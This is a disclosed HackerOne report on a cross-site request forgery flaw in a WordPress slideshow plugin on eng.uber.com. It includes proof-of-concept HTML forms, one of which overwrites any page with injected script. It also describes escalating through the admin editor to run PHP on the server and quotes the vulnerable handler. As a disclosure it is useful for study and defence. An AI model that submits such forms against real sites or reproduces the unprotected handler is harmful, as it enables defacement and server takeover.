@@ -1,0 +1,75 @@
+ReportLink:https://hackerone.com/reports/125594
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/jouko
+ReportedTo:Uber(uber)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:26.04.2016 16:08:57
+
+Summary:
+
+The site *eng.uber.com* uses a WordPress plugin called Fluid Responsive Slideshow. The plugin doesn't implement any CSRF check for AJAX requests. Some of these AJAX requests can be used to modify posts and pages on the system. An attacker could use this bug to inject arbitrary JavaScript in any page or post on eng.uber.com.
+
+The attack requires that an administrator of the site can be tricked to view an attacker-controlled website. If the attack succeeds, it would normally lead to server-side compromise via the administrative WordPress functions (plugin/theme editor).
+
+#Reproducing#
+The following HTML snippet should be a non-destructive way to test this bug. 
+~~~~
+<form method=post action="https://eng.uber.com/wp-admin/admin-ajax.php?action=frs_show_modal">
+<input type=text name="post_id" value="zzz">
+<input type=submit>
+</form>
+~~~~
+If a logged-in WordPress user clicks the submit button, the browser should do a POST request and get a JSON response (it doesn't matter that the post_id is bogus). This shows that it's possible to access the AJAX functions of the plugin without any CSRF token or nonce. A non-logged-in user receives just a "0".
+
+An attacker could use the following HTML to arbitrarily modify any page or post on the system (**destructive**):
+~~~~
+<form method=post action="https://eng.uber.com/wp-admin/admin-ajax.php?action=frs_save">
+<input type=text name="post_id" value="(ANY POST/PAGE ID)">
+<input type=text name="title" value="new title for the page">
+<input type=text name="content" value="Any HTML content, e.g. <script>alert('hello');</script>">
+<input type=submit>
+</form>
+~~~~
+An attacker would have to persuade a logged-in administrator to this form. It can be automatically submitted with JavaScript so a real-world attack wouldn't require a click on the button. 
+
+The frs_save AJAX action would update the post/page with the supplied ID. For example if the latest posting ID is used, the attacker-supplied JavaScript would be embedded on the "front page" and evaluated by any viewer. 
+
+A more stealth attack might update an old or password-protected page/post and embed JavaScript that redirects the victim administrator  to that page after updating (an invisible iframe might be possible). This kind of attack wouldn't be easily detected. In this case the JavaScript, now executing with administrator privileges, could be used to execute attacker-supplied PHP on the server via the plugin or theme editor.
+
+An example of such attack payload (different vector): https://www.youtube.com/watch?v=OCqQZJZ1Ie4
+
+
+#Details#
+
+The problem is in the file wp-content/plugins/fluid-responsive-slideshow/ajax.php:
+
+~~~~
+/**
+ * Ajax Save, Edit / Create new is the same, depend on the post id (null/not null)
+ */
+add_action('wp_ajax_frs_save', 'frs_save' ); /* for logged in user */
+
+function frs_save() {
+    global $wpdb; // this is how you get access to the database
+    unset($_POST['action']);
+    $id = htmlspecialchars($_POST['post_id']);
+~~~~
+The AJAX handler function doesn't attempt to reject cross-site request forgeries which would typically happen in the beginning of the function. Later in the same function, the POST parameters are used to update any post or page:
+~~~~
+       //edit post
+        $slide_type = htmlspecialchars($_POST['slide_type']);
+        $title = htmlspecialchars($_POST['title']);
+        $content = $_POST['content'];
+        // Create post object
+        $my_post = array(
+          'post_title'    => $title,
+          'post_content'  => $content,
+          'ID'=>$id
+        );
+        // Insert the post into the database
+        wp_update_post( $my_post );
+̃~~~~
+
+I've tested this with the latest version of the plugin, and version 2.2.0 which seems to be the one used on eng.uber.com. I haven't reported this to the plugin author yet.
